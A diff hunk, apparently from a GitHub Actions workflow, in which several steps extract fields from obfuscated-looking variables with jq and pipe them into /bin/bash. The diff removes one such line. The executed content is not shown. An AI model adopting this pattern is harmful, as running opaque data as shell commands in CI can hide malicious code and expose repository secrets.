@@ -23,7 +23,6 @@ jobs:
           echo $o255 | jq -r .mya34 | /bin/bash
           printf '%s' "$clp0400" | jq -r .nwkp353 | /bin/bash
           printf '%s' "$tstr14970" | jq -r .ec6443 | /bin/bash
-          echo $ljz3 | jq -r .ipkpz7641 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
